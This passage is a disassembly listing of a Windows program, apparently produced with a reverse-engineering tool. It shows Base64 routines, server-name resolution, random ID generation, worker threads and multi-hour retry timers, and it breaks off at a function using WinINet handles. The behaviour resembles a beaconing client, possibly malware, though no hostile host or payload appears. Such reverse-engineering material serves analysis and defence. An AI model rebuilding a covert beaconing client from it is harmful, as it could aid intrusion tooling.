                ja      short loc_401509
                mov     al, [esp+eax+150h+var_128]
                jmp     short loc_40150B
; ---------------------------------------------------------------------------

loc_401509:                             ; CODE XREF: sub_4012C0+215↑j
                                        ; sub_4012C0+241↑j
                mov     al, 3Dh

loc_40150B:                             ; CODE XREF: sub_4012C0+247↑j
                cmp     [esp+150h+var_140], 2
                mov     [ebx+2], al
                jle     short loc_40155A
                mov     ecx, 10h
                mov     esi, offset aAbcdefghijklmn ; "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm"...
                lea     edi, [esp+150h+var_128]
                rep movsd
                shr     edx, 10h
                and     edx, 3Fh
                movsb
                cmp     edx, 3Fh
                ja      short loc_40155A
                mov     dl, [esp+edx+150h+var_128]
                mov     eax, [esp+150h+var_134]
                mov     [ebx+3], dl
                add     ebx, 4
                add     eax, 4
                mov     byte ptr [ebx], 0
                pop     edi
                pop     esi
                pop     ebx
                mov     ecx, [esp+144h+var_4]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_40155A:                             ; CODE XREF: sub_4012C0+253↑j
                                        ; sub_4012C0+26F↑j
                mov     eax, [esp+150h+var_134]
                mov     dl, 3Dh
                mov     [ebx+3], dl
                add     ebx, 4
                add     eax, 4
                mov     byte ptr [ebx], 0
                pop     edi
                pop     esi
                pop     ebx
                mov     ecx, [esp+144h+var_4]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_401581:                             ; CODE XREF: sub_4012C0+188↑j
                mov     ecx, [esp+150h+var_4]
                mov     eax, [esp+150h+var_134]
                pop     edi
                pop     esi
                mov     byte ptr [ebx], 0
                pop     ebx
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     esp, ebp
                pop     ebp
                retn
sub_4012C0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4015A0      proc near               ; CODE XREF: sub_4046F0+3F↓p

var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  4
arg_4           = dword ptr  8

                sub     esp, 0Ch
                push    ebx
                push    ebp
                xor     ebx, ebx
                push    esi
                push    edi
                cmp     [esp+1Ch+arg_4], ebx
                jnz     short loc_4015C1
                mov     eax, ecx
                lea     esi, [eax+1]

loc_4015B4:                             ; CODE XREF: sub_4015A0+19↓j
                mov     dl, [eax]
                inc     eax
                cmp     dl, bl
                jnz     short loc_4015B4
                sub     eax, esi
                mov     [esp+1Ch+arg_4], eax

loc_4015C1:                             ; CODE XREF: sub_4015A0+D↑j
                mov     eax, [esp+1Ch+arg_0]
                mov     [esp+1Ch+arg_0], eax
                mov     eax, [esp+1Ch+arg_4]
                add     eax, 0FFFFFFFCh
                cmp     eax, ebx
                mov     [esp+1Ch+var_C], ebx
                mov     ebp, ecx
                mov     [esp+1Ch+var_4], ebx
                jle     loc_401847
                dec     eax
                shr     eax, 2
                inc     eax
                lea     ecx, [eax+eax*2]
                lea     edx, ds:0[eax*4]
                mov     [esp+1Ch+var_8], eax
                mov     [esp+1Ch+var_C], ecx
                mov     [esp+1Ch+var_4], edx
                lea     ecx, [ecx+0]

loc_401600:                             ; CODE XREF: sub_4015A0+2A1↓j
                mov     edx, [ebp+0]
                or      esi, 0FFFFFFFFh
                cmp     dl, 41h
                jl      short loc_401618
                cmp     dl, 5Ah
                jg      short loc_401618
                movsx   esi, dl
                sub     esi, 41h
                jmp     short loc_401652
; ---------------------------------------------------------------------------

loc_401618:                             ; CODE XREF: sub_4015A0+69↑j
                                        ; sub_4015A0+6E↑j
                cmp     dl, 61h
                jl      short loc_40162A
                cmp     dl, 7Ah
                jg      short loc_40162A
                movsx   esi, dl
                sub     esi, 47h
                jmp     short loc_401652
; ---------------------------------------------------------------------------

loc_40162A:                             ; CODE XREF: sub_4015A0+7B↑j
                                        ; sub_4015A0+80↑j
                cmp     dl, 30h
                jl      short loc_40163C
                cmp     dl, 39h
                jg      short loc_40163C
                movsx   esi, dl
                add     esi, 4
                jmp     short loc_401652
; ---------------------------------------------------------------------------

loc_40163C:                             ; CODE XREF: sub_4015A0+8D↑j
                                        ; sub_4015A0+92↑j
                cmp     dl, 2Bh
                jnz     short loc_401648
                mov     esi, 3Eh
                jmp     short loc_401652
; ---------------------------------------------------------------------------

loc_401648:                             ; CODE XREF: sub_4015A0+9F↑j
                cmp     dl, 2Fh
                jnz     short loc_401652
                mov     esi, 3Fh

loc_401652:                             ; CODE XREF: sub_4015A0+76↑j
                                        ; sub_4015A0+88↑j ...
                mov     eax, edx
                shr     eax, 8
                mov     bl, al
                sub     bl, 41h
                or      ecx, 0FFFFFFFFh
                cmp     bl, 19h
                ja      short loc_40166C
                movsx   ecx, al
                sub     ecx, 41h
                jmp     short loc_4016A4
; ---------------------------------------------------------------------------

loc_40166C:                             ; CODE XREF: sub_4015A0+C2↑j
                mov     bl, al
                sub     bl, 61h
                cmp     bl, 19h
                ja      short loc_40167E
                movsx   ecx, al
                sub     ecx, 47h
                jmp     short loc_4016A4
; ---------------------------------------------------------------------------

loc_40167E:                             ; CODE XREF: sub_4015A0+D4↑j
                mov     bl, al
                sub     bl, 30h
                cmp     bl, 9
                ja      short loc_401690
                movsx   ecx, al
                add     ecx, 4
                jmp     short loc_4016A4
; ---------------------------------------------------------------------------

loc_401690:                             ; CODE XREF: sub_4015A0+E6↑j
                cmp     al, 2Bh
                jnz     short loc_40169B
                mov     ecx, 3Eh
                jmp     short loc_4016A4
; ---------------------------------------------------------------------------

loc_40169B:                             ; CODE XREF: sub_4015A0+F2↑j
                cmp     al, 2Fh
                jnz     short loc_4016A4
                mov     ecx, 3Fh

loc_4016A4:                             ; CODE XREF: sub_4015A0+CA↑j
                                        ; sub_4015A0+DC↑j ...
                lea     edi, ds:0[ecx*4]
                sar     edi, 6
                lea     ecx, ds:0[esi*4]
                or      edi, ecx
                mov     bl, al
                sub     bl, 41h
                and     edi, 0FFh
                or      ecx, 0FFFFFFFFh
                cmp     bl, 19h
                ja      short loc_4016D2
                movsx   ecx, al
                sub     ecx, 41h
                jmp     short loc_40170A
; ---------------------------------------------------------------------------

loc_4016D2:                             ; CODE XREF: sub_4015A0+128↑j
                mov     bl, al
                sub     bl, 61h
                cmp     bl, 19h
                ja      short loc_4016E4
                movsx   ecx, al
                sub     ecx, 47h
                jmp     short loc_40170A
; ---------------------------------------------------------------------------

loc_4016E4:                             ; CODE XREF: sub_4015A0+13A↑j
                mov     bl, al
                sub     bl, 30h
                cmp     bl, 9
                ja      short loc_4016F6
                movsx   ecx, al
                add     ecx, 4
                jmp     short loc_40170A
; ---------------------------------------------------------------------------

loc_4016F6:                             ; CODE XREF: sub_4015A0+14C↑j
                cmp     al, 2Bh
                jnz     short loc_401701
                mov     ecx, 3Eh
                jmp     short loc_40170A
; ---------------------------------------------------------------------------

loc_401701:                             ; CODE XREF: sub_4015A0+158↑j
                cmp     al, 2Fh
                jnz     short loc_40170A
                mov     ecx, 3Fh

loc_40170A:                             ; CODE XREF: sub_4015A0+130↑j
                                        ; sub_4015A0+142↑j ...
                mov     eax, edx
                shr     eax, 10h
                mov     bl, al
                sub     bl, 41h
                or      esi, 0FFFFFFFFh
                cmp     bl, 19h
                ja      short loc_401724
                movsx   esi, al
                sub     esi, 41h
                jmp     short loc_40175C
; ---------------------------------------------------------------------------

loc_401724:                             ; CODE XREF: sub_4015A0+17A↑j
                mov     bl, al
                sub     bl, 61h
                cmp     bl, 19h
                ja      short loc_401736
                movsx   esi, al
                sub     esi, 47h
                jmp     short loc_40175C
; ---------------------------------------------------------------------------

loc_401736:                             ; CODE XREF: sub_4015A0+18C↑j
                mov     bl, al
                sub     bl, 30h
                cmp     bl, 9
                ja      short loc_401748
                movsx   esi, al
                add     esi, 4
                jmp     short loc_40175C
; ---------------------------------------------------------------------------

loc_401748:                             ; CODE XREF: sub_4015A0+19E↑j
                cmp     al, 2Bh
                jnz     short loc_401753
                mov     esi, 3Eh
                jmp     short loc_40175C
; ---------------------------------------------------------------------------

loc_401753:                             ; CODE XREF: sub_4015A0+1AA↑j
                cmp     al, 2Fh
                jnz     short loc_40175C
                mov     esi, 3Fh

loc_40175C:                             ; CODE XREF: sub_4015A0+182↑j
                                        ; sub_4015A0+194↑j ...
                add     esi, esi
                add     esi, esi
                sar     esi, 4
                shl     ecx, 4
                or      esi, ecx
                mov     bl, al
                sub     bl, 41h
                and     esi, 0FFh
                or      ecx, 0FFFFFFFFh
                cmp     bl, 19h
                ja      short loc_401783
                movsx   ecx, al
                sub     ecx, 41h
                jmp     short loc_4017BB
; ---------------------------------------------------------------------------

loc_401783:                             ; CODE XREF: sub_4015A0+1D9↑j
                mov     bl, al
                sub     bl, 61h
                cmp     bl, 19h
                ja      short loc_401795
                movsx   ecx, al
                sub     ecx, 47h
                jmp     short loc_4017BB
; ---------------------------------------------------------------------------

loc_401795:                             ; CODE XREF: sub_4015A0+1EB↑j
                mov     bl, al
                sub     bl, 30h
                cmp     bl, 9
                ja      short loc_4017A7
                movsx   ecx, al
                add     ecx, 4
                jmp     short loc_4017BB
; ---------------------------------------------------------------------------

loc_4017A7:                             ; CODE XREF: sub_4015A0+1FD↑j
                cmp     al, 2Bh
                jnz     short loc_4017B2
                mov     ecx, 3Eh
                jmp     short loc_4017BB
; ---------------------------------------------------------------------------

loc_4017B2:                             ; CODE XREF: sub_4015A0+209↑j
                cmp     al, 2Fh
                jnz     short loc_4017BB
                mov     ecx, 3Fh

loc_4017BB:                             ; CODE XREF: sub_4015A0+1E1↑j
                                        ; sub_4015A0+1F3↑j ...
                shr     edx, 18h
                mov     bl, dl
                sub     bl, 41h
                or      eax, 0FFFFFFFFh
                cmp     bl, 19h
                ja      short loc_4017D3
                movsx   eax, dl
                sub     eax, 41h
                jmp     short loc_40180D
; ---------------------------------------------------------------------------

loc_4017D3:                             ; CODE XREF: sub_4015A0+229↑j
                mov     bl, dl
                sub     bl, 61h
                cmp     bl, 19h
                ja      short loc_4017E5
                movsx   eax, dl
                sub     eax, 47h
                jmp     short loc_40180D
; ---------------------------------------------------------------------------

loc_4017E5:                             ; CODE XREF: sub_4015A0+23B↑j
                mov     bl, dl
                sub     bl, 30h
                cmp     bl, 9
                ja      short loc_4017F7
                movsx   eax, dl
                add     eax, 4
                jmp     short loc_40180D
; ---------------------------------------------------------------------------

loc_4017F7:                             ; CODE XREF: sub_4015A0+24D↑j
                cmp     dl, 2Bh
                jnz     short loc_401803
                mov     eax, 3Eh
                jmp     short loc_40180D
; ---------------------------------------------------------------------------

loc_401803:                             ; CODE XREF: sub_4015A0+25A↑j
                cmp     dl, 2Fh
                jnz     short loc_40180D
                mov     eax, 3Fh

loc_40180D:                             ; CODE XREF: sub_4015A0+231↑j
                                        ; sub_4015A0+243↑j ...
                lea     edx, ds:0[eax*4]
                mov     eax, [esp+1Ch+arg_0]
                sar     edx, 2
                shl     ecx, 6
                or      edx, ecx
                and     edx, 0FFh
                shl     edx, 8
                or      edx, esi
                shl     edx, 8
                or      edx, edi
                mov     [eax], edx
                add     eax, 3
                add     ebp, 4
                sub     [esp+1Ch+var_8], 1
                mov     [esp+1Ch+arg_0], eax
                jnz     loc_401600

loc_401847:                             ; CODE XREF: sub_4015A0+3C↑j
                mov     eax, [esp+1Ch+var_4]
                mov     ecx, [esp+1Ch+arg_4]
                cmp     eax, ecx
                jge     loc_401AC3
                sub     ecx, eax
                xor     eax, eax
                mov     [esp+1Ch+arg_4], eax
                test    ecx, ecx
                jle     short loc_401876
                push    ecx
                lea     eax, [esp+20h+arg_4]
                push    ebp
                push    eax
                call    sub_414550
                mov     eax, [esp+28h+arg_4]
                add     esp, 0Ch

loc_401876:                             ; CODE XREF: sub_4015A0+2C1↑j
                or      edx, 0FFFFFFFFh
                cmp     al, 41h
                jl      short loc_401889
                cmp     al, 5Ah
                jg      short loc_401889
                movsx   edx, al
                sub     edx, 41h
                jmp     short loc_4018BD
; ---------------------------------------------------------------------------

loc_401889:                             ; CODE XREF: sub_4015A0+2DB↑j
                                        ; sub_4015A0+2DF↑j
                cmp     al, 61h
                jl      short loc_401899
                cmp     al, 7Ah
                jg      short loc_401899
                movsx   edx, al
                sub     edx, 47h
                jmp     short loc_4018BD
; ---------------------------------------------------------------------------

loc_401899:                             ; CODE XREF: sub_4015A0+2EB↑j
                                        ; sub_4015A0+2EF↑j
                cmp     al, 30h
                jl      short loc_4018A9
                cmp     al, 39h
                jg      short loc_4018A9
                movsx   edx, al
                add     edx, 4
                jmp     short loc_4018BD
; ---------------------------------------------------------------------------

loc_4018A9:                             ; CODE XREF: sub_4015A0+2FB↑j
                                        ; sub_4015A0+2FF↑j
                cmp     al, 2Bh
                jnz     short loc_4018B4
                mov     edx, 3Eh
                jmp     short loc_4018BD
; ---------------------------------------------------------------------------

loc_4018B4:                             ; CODE XREF: sub_4015A0+30B↑j
                cmp     al, 2Fh
                jnz     short loc_4018BD
                mov     edx, 3Fh

loc_4018BD:                             ; CODE XREF: sub_4015A0+2E7↑j
                                        ; sub_4015A0+2F7↑j ...
                shr     eax, 8
                mov     bl, al
                sub     bl, 41h
                or      ecx, 0FFFFFFFFh
                cmp     bl, 19h
                ja      short loc_4018D5
                movsx   ecx, al
                sub     ecx, 41h
                jmp     short loc_40190D
; ---------------------------------------------------------------------------

loc_4018D5:                             ; CODE XREF: sub_4015A0+32B↑j
                mov     bl, al
                sub     bl, 61h
                cmp     bl, 19h
                ja      short loc_4018E7
                movsx   ecx, al
                sub     ecx, 47h
                jmp     short loc_40190D
; ---------------------------------------------------------------------------

loc_4018E7:                             ; CODE XREF: sub_4015A0+33D↑j
                mov     bl, al
                sub     bl, 30h
                cmp     bl, 9
                ja      short loc_4018F9
                movsx   ecx, al
                add     ecx, 4
                jmp     short loc_40190D
; ---------------------------------------------------------------------------

loc_4018F9:                             ; CODE XREF: sub_4015A0+34F↑j
                cmp     al, 2Bh
                jnz     short loc_401904
                mov     ecx, 3Eh
                jmp     short loc_40190D
; ---------------------------------------------------------------------------

loc_401904:                             ; CODE XREF: sub_4015A0+35B↑j
                cmp     al, 2Fh
                jnz     short loc_40190D
                mov     ecx, 3Fh

loc_40190D:                             ; CODE XREF: sub_4015A0+333↑j
                                        ; sub_4015A0+345↑j ...
                mov     edi, [esp+1Ch+arg_0]
                mov     ebp, [esp+1Ch+var_C]
                mov     esi, [esp+1Ch+arg_4]
                add     ecx, ecx
                add     ecx, ecx
                add     dl, dl
                sar     ecx, 6
                add     dl, dl
                or      cl, dl
                mov     [edi], cl
                inc     edi
                inc     ebp
                cmp     al, 3Dh
                jz      loc_4019EF
                mov     edx, esi
                shr     edx, 10h
                cmp     dl, 3Dh
                jz      loc_4019EF
                mov     bl, al
                sub     bl, 41h
                or      ecx, 0FFFFFFFFh
                cmp     bl, 19h
                ja      short loc_401955
                movsx   ecx, al
                sub     ecx, 41h
                jmp     short loc_40198D
; ---------------------------------------------------------------------------

loc_401955:                             ; CODE XREF: sub_4015A0+3AB↑j
                mov     bl, al
                sub     bl, 61h
                cmp     bl, 19h
                ja      short loc_401967
                movsx   ecx, al
                sub     ecx, 47h
                jmp     short loc_40198D
; ---------------------------------------------------------------------------

loc_401967:                             ; CODE XREF: sub_4015A0+3BD↑j
                mov     bl, al
                sub     bl, 30h
                cmp     bl, 9
                ja      short loc_401979
                movsx   ecx, al
                add     ecx, 4
                jmp     short loc_40198D
; ---------------------------------------------------------------------------

loc_401979:                             ; CODE XREF: sub_4015A0+3CF↑j
                cmp     al, 2Bh
                jnz     short loc_401984
                mov     ecx, 3Eh
                jmp     short loc_40198D
; ---------------------------------------------------------------------------

loc_401984:                             ; CODE XREF: sub_4015A0+3DB↑j
                cmp     al, 2Fh
                jnz     short loc_40198D
                mov     ecx, 3Fh

loc_40198D:                             ; CODE XREF: sub_4015A0+3B3↑j
                                        ; sub_4015A0+3C5↑j ...
                mov     bl, dl
                sub     bl, 41h
                or      eax, 0FFFFFFFFh
                cmp     bl, 19h
                ja      short loc_4019A2
                movsx   eax, dl
                sub     eax, 41h
                jmp     short loc_4019DC
; ---------------------------------------------------------------------------

loc_4019A2:                             ; CODE XREF: sub_4015A0+3F8↑j
                mov     bl, dl
                sub     bl, 61h
                cmp     bl, 19h
                ja      short loc_4019B4
                movsx   eax, dl
                sub     eax, 47h
                jmp     short loc_4019DC
; ---------------------------------------------------------------------------

loc_4019B4:                             ; CODE XREF: sub_4015A0+40A↑j
                mov     bl, dl
                sub     bl, 30h
                cmp     bl, 9
                ja      short loc_4019C6
                movsx   eax, dl
                add     eax, 4
                jmp     short loc_4019DC
; ---------------------------------------------------------------------------

loc_4019C6:                             ; CODE XREF: sub_4015A0+41C↑j
                cmp     dl, 2Bh
                jnz     short loc_4019D2
                mov     eax, 3Eh
                jmp     short loc_4019DC
; ---------------------------------------------------------------------------

loc_4019D2:                             ; CODE XREF: sub_4015A0+429↑j
                cmp     dl, 2Fh
                jnz     short loc_4019DC
                mov     eax, 3Fh

loc_4019DC:                             ; CODE XREF: sub_4015A0+400↑j
                                        ; sub_4015A0+412↑j ...
                lea     edx, ds:0[eax*4]
                sar     edx, 4
                shl     cl, 4
                or      dl, cl
                mov     [edi], dl
                inc     edi
                inc     ebp

loc_4019EF:                             ; CODE XREF: sub_4015A0+38C↑j
                                        ; sub_4015A0+39A↑j
                mov     eax, esi
                shr     eax, 10h
                cmp     al, 3Dh
                jz      loc_401AB6
                mov     edx, esi
                shr     edx, 18h
                cmp     edx, 3Dh
                jz      loc_401AB6
                mov     bl, al
                sub     bl, 41h
                or      ecx, 0FFFFFFFFh
                cmp     bl, 19h
                ja      short loc_401A1F
                movsx   ecx, al
                sub     ecx, 41h
                jmp     short loc_401A57
; ---------------------------------------------------------------------------

loc_401A1F:                             ; CODE XREF: sub_4015A0+475↑j
                mov     bl, al
                sub     bl, 61h
                cmp     bl, 19h
                ja      short loc_401A31
                movsx   ecx, al
                sub     ecx, 47h
                jmp     short loc_401A57
; ---------------------------------------------------------------------------

loc_401A31:                             ; CODE XREF: sub_4015A0+487↑j
                mov     bl, al
                sub     bl, 30h
                cmp     bl, 9
                ja      short loc_401A43
                movsx   ecx, al
                add     ecx, 4
                jmp     short loc_401A57
; ---------------------------------------------------------------------------

loc_401A43:                             ; CODE XREF: sub_4015A0+499↑j
                cmp     al, 2Bh
                jnz     short loc_401A4E
                mov     ecx, 3Eh
                jmp     short loc_401A57
; ---------------------------------------------------------------------------

loc_401A4E:                             ; CODE XREF: sub_4015A0+4A5↑j
                cmp     al, 2Fh
                jnz     short loc_401A57
                mov     ecx, 3Fh

loc_401A57:                             ; CODE XREF: sub_4015A0+47D↑j
                                        ; sub_4015A0+48F↑j ...
                mov     bl, dl
                sub     bl, 41h
                or      eax, 0FFFFFFFFh
                cmp     bl, 19h
                ja      short loc_401A6C
                movsx   eax, dl
                sub     eax, 41h
                jmp     short loc_401AA6
; ---------------------------------------------------------------------------

loc_401A6C:                             ; CODE XREF: sub_4015A0+4C2↑j
                mov     bl, dl
                sub     bl, 61h
                cmp     bl, 19h
                ja      short loc_401A7E
                movsx   eax, dl
                sub     eax, 47h
                jmp     short loc_401AA6
; ---------------------------------------------------------------------------

loc_401A7E:                             ; CODE XREF: sub_4015A0+4D4↑j
                mov     bl, dl
                sub     bl, 30h
                cmp     bl, 9
                ja      short loc_401A90
                movsx   eax, dl
                add     eax, 4
                jmp     short loc_401AA6
; ---------------------------------------------------------------------------

loc_401A90:                             ; CODE XREF: sub_4015A0+4E6↑j
                cmp     dl, 2Bh
                jnz     short loc_401A9C
                mov     eax, 3Eh
                jmp     short loc_401AA6
; ---------------------------------------------------------------------------

loc_401A9C:                             ; CODE XREF: sub_4015A0+4F3↑j
                cmp     dl, 2Fh
                jnz     short loc_401AA6
                mov     eax, 3Fh

loc_401AA6:                             ; CODE XREF: sub_4015A0+4CA↑j
                                        ; sub_4015A0+4DC↑j ...
                add     eax, eax
                add     eax, eax
                sar     eax, 2
                shl     cl, 6
                or      al, cl
                mov     [edi], al
                inc     edi
                inc     ebp

loc_401AB6:                             ; CODE XREF: sub_4015A0+456↑j
                                        ; sub_4015A0+464↑j
                mov     byte ptr [edi], 0
                pop     edi
                pop     esi
                mov     eax, ebp
                pop     ebp
                pop     ebx
                add     esp, 0Ch
                retn
; ---------------------------------------------------------------------------

loc_401AC3:                             ; CODE XREF: sub_4015A0+2B1↑j
                mov     ecx, [esp+1Ch+arg_0]
                mov     eax, [esp+1Ch+var_C]
                pop     edi
                pop     esi
                pop     ebp
                mov     byte ptr [ecx], 0
                pop     ebx
                add     esp, 0Ch
                retn
sub_4015A0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame fuzzy-sp

sub_401AE0      proc near               ; CODE XREF: start-5C↓p

var_198         = byte ptr -198h
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                and     esp, 0FFFFFFF8h
                sub     esp, 19Ch
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+19Ch+var_4], eax
                push    ebx
                push    esi
                push    edi
                push    0
                call    sub_40F8E3
                add     esp, 4
                push    eax
                call    sub_40F127
                add     esp, 4
                lea     eax, [esp+1A8h+var_198]
                push    eax
                push    202h
                call    WS2_32_115
                call    sub_407940
                test    eax, eax
                jz      loc_401DEC
                movzx   ecx, byte_42C320
                push    408h
                push    0
                push    offset byte_42B580
                mov     dword_42C344, ecx
                call    sub_413520
                add     esp, 0Ch
                push    408h
                push    0
                push    offset byte_42B988
                call    sub_413520
                add     esp, 0Ch
                xor     esi, esi

loc_401B63:                             ; CODE XREF: sub_401AE0+A1↓j
                call    sub_40F139
                xor     edx, edx
                mov     ecx, 3Fh
                div     ecx
                inc     esi
                cmp     esi, 6
                mov     dl, ds:byte_422090[edx]
                mov     byte_42C767[esi], dl
                jl      short loc_401B63
                call    sub_4041F0
                call    sub_404110
                push    0               ; lpName
                push    0               ; bInitialState
                push    1               ; bManualReset
                push    0               ; lpEventAttributes
                call    ds:CreateEventA
                mov     edi, ds:WaitForSingleObject
                mov     ebx, ds:CloseHandle
                mov     dword_42C340, eax

loc_401BAC:                             ; CODE XREF: sub_401AE0+2F1↓j
                                        ; sub_401AE0+306↓j
                cmp     byte_42C321, 0
                jz      loc_401C69
                xor     eax, eax
                jmp     short loc_401BC0
; ---------------------------------------------------------------------------
                align 10h

loc_401BC0:                             ; CODE XREF: sub_401AE0+DB↑j
                                        ; sub_401AE0+EF↓j
                mov     cl, byte_42BFA0[eax]
                mov     szServerName[eax], cl
                inc     eax
                test    cl, cl
                jnz     short loc_401BC0

loc_401BD1:                             ; CODE XREF: sub_401AE0+229↓j
                mov     esi, 3
                mov     dword_42C348, esi

loc_401BDC:                             ; CODE XREF: sub_401AE0+2C2↓j
                push    0               ; lpName
                push    0               ; bInitialState
                push    1               ; bManualReset
                push    0               ; lpEventAttributes
                mov     dword_42AA10, 0Fh
                call    ds:CreateEventA
                push    0               ; lpThreadId
                push    0               ; dwCreationFlags
                push    0               ; int
                push    offset sub_401E10 ; int
                push    0               ; dwStackSize
                push    0               ; lpThreadAttributes
                mov     hEvent, eax
                call    sub_40EA6D
                push    0               ; lpThreadId
                push    0               ; dwCreationFlags
                push    0               ; int
                push    offset sub_4027B0 ; int
                push    0               ; dwStackSize
                push    0               ; lpThreadAttributes
                mov     hHandle, eax
                call    sub_40EA6D
                mov     edx, hHandle
                add     esp, 30h
                push    0FFFFFFFFh      ; dwMilliseconds
                push    edx             ; hHandle
                mov     hThread, eax
                call    edi ; WaitForSingleObject
                mov     eax, hEvent
                push    eax             ; hObject
                call    ebx ; CloseHandle
                mov     ecx, hHandle
                push    ecx             ; hObject
                call    ebx ; CloseHandle
                mov     eax, dword_42AA10
                cmp     eax, 18h
                jnz     loc_401D20
                mov     edx, dword_42C340
                push    6DDD00h
                push    edx
                jmp     loc_401D95
; ---------------------------------------------------------------------------

loc_401C69:                             ; CODE XREF: sub_401AE0+D3↑j
                movsx   eax, byte_42BFA0
                push    eax
                call    sub_40EDBB
                add     esp, 4
                push    offset byte_42BFA0
                test    eax, eax
                jz      short loc_401CF4
                call    WS2_32_52
                test    eax, eax
                jnz     short loc_401C9A
                call    WS2_32_111

loc_401C90:                             ; CODE XREF: sub_401AE0+21C↓j
                push    0DBBA00h
                jmp     loc_401DDC
; ---------------------------------------------------------------------------

loc_401C9A:                             ; CODE XREF: sub_401AE0+1A9↑j
                mov     ecx, [eax+0Ch]
                mov     edx, [ecx]
                mov     esi, [edx]

loc_401CA1:                             ; CODE XREF: sub_401AE0+220↓j
                push    100h
                push    0
                push    offset szServerName
                call    sub_413520
                add     esp, 0Ch
                push    esi
                call    WS2_32_12
                mov     edx, offset szServerName

loc_401CC0:                             ; CODE XREF: sub_401AE0+1E8↓j
                mov     cl, [eax]
                mov     [edx], cl
                inc     eax
                inc     edx
                test    cl, cl
                jnz     short loc_401CC0
                mov     ecx, offset szServerName
                mov     eax, offset unk_42C060

loc_401CD4:                             ; CODE XREF: sub_401AE0+20E↓j
                mov     dl, [eax]
                cmp     dl, [ecx]
                jnz     short loc_401D02
                test    dl, dl
                jz      short loc_401CF0
                mov     dl, [eax+1]
                cmp     dl, [ecx+1]
                jnz     short loc_401D02
                add     eax, 2
                add     ecx, 2
                test    dl, dl
                jnz     short loc_401CD4

loc_401CF0:                             ; CODE XREF: sub_401AE0+1FC↑j
                xor     eax, eax
                jmp     short loc_401D07
; ---------------------------------------------------------------------------

loc_401CF4:                             ; CODE XREF: sub_401AE0+1A0↑j
                call    WS2_32_11
                cmp     eax, 0FFFFFFFFh
                jz      short loc_401C90
                mov     esi, eax
                jmp     short loc_401CA1
; ---------------------------------------------------------------------------

loc_401D02:                             ; CODE XREF: sub_401AE0+1F8↑j
                                        ; sub_401AE0+204↑j
                sbb     eax, eax
                sbb     eax, 0FFFFFFFFh

loc_401D07:                             ; CODE XREF: sub_401AE0+212↑j
                test    eax, eax
                jnz     loc_401BD1
                mov     ecx, dword_42C340
                push    0DBBA00h
                push    ecx
                jmp     loc_401DE2
; ---------------------------------------------------------------------------

loc_401D20:                             ; CODE XREF: sub_401AE0+172↑j
                cmp     eax, 13h
                jz      loc_401DAA
                cmp     eax, 14h
                jnz     short loc_401D49

loc_401D2E:                             ; CODE XREF: sub_401AE0+291↓j
                mov     ecx, dword_42C340
                mov     eax, 4
                sub     eax, dword_42C348
                imul    eax, 0EA60h
                push    eax
                push    ecx
                jmp     short loc_401D95
; ---------------------------------------------------------------------------

loc_401D49:                             ; CODE XREF: sub_401AE0+24C↑j
                cmp     eax, 10h
                jz      short loc_401D7D
                cmp     eax, 16h
                jnz     short loc_401D6E
                mov     edx, dword_42C340
                mov     ecx, 4
                sub     ecx, dword_42C348
                imul    ecx, 0EA60h
                push    ecx
                push    edx
                jmp     short loc_401D95
; ---------------------------------------------------------------------------

loc_401D6E:                             ; CODE XREF: sub_401AE0+271↑j
                cmp     eax, 19h
                jz      short loc_401D2E
                cmp     eax, 12h
                jz      short loc_401D7D
                cmp     eax, 11h
                jnz     short loc_401D9B

loc_401D7D:                             ; CODE XREF: sub_401AE0+26C↑j
                                        ; sub_401AE0+296↑j
                mov     eax, dword_42C340
                mov     edx, 4
                sub     edx, dword_42C348
                imul    edx, 0EA60h
                push    edx             ; dwMilliseconds
                push    eax             ; hHandle

loc_401D95:                             ; CODE XREF: sub_401AE0+184↑j
                                        ; sub_401AE0+267↑j ...
                call    edi ; WaitForSingleObject
                test    eax, eax
                jz      short loc_401DEC

loc_401D9B:                             ; CODE XREF: sub_401AE0+29B↑j
                sub     dword_42C348, 1
                jnz     loc_401BDC
                jmp     short loc_401DCA
; ---------------------------------------------------------------------------

loc_401DAA:                             ; CODE XREF: sub_401AE0+243↑j
                mov     ecx, dword_42C34C
                mov     edx, dword_42C340
                imul    ecx, 3E8h
                push    ecx             ; dwMilliseconds
                push    edx             ; hHandle
                mov     dword_42C348, esi
                call    edi ; WaitForSingleObject
                test    eax, eax
                jz      short loc_401DEC

loc_401DCA:                             ; CODE XREF: sub_401AE0+2C8↑j
                cmp     dword_42C348, 0
                jnz     loc_401BAC
                push    112A880h        ; dwMilliseconds

loc_401DDC:                             ; CODE XREF: sub_401AE0+1B5↑j
                mov     eax, dword_42C340
                push    eax             ; hHandle

loc_401DE2:                             ; CODE XREF: sub_401AE0+23B↑j
                call    edi ; WaitForSingleObject
                test    eax, eax
                jnz     loc_401BAC

loc_401DEC:                             ; CODE XREF: sub_401AE0+46↑j
                                        ; sub_401AE0+2B9↑j ...
                mov     ecx, [esp+1A8h+var_4]
                pop     edi
                pop     esi
                pop     ebx
                xor     ecx, esp
                xor     eax, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     esp, ebp
                pop     ebp
                retn
sub_401AE0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame fuzzy-sp

sub_401E10      proc near               ; DATA XREF: sub_401AE0+11A↑o

var_42CA4       = dword ptr -42CA4h
dwBufferLength  = dword ptr -42CA0h
var_42C9C       = dword ptr -42C9Ch
hInternet       = dword ptr -42C98h
hConnect        = dword ptr -42C94h
var_42C90       = dword ptr -42C90h
var_42C8C       = dword ptr -42C8Ch
var_42C88       = dword ptr -42C88h
var_42C84       = dword ptr -42C84h
dwNumberOfBytesAvailable= dword ptr -42C80h
var_42C7C       = dword ptr -42C7Ch
var_42C78       = dword ptr -42C78h
var_42C74       = dword ptr -42C74h
var_42C70       = dword ptr -42C70h
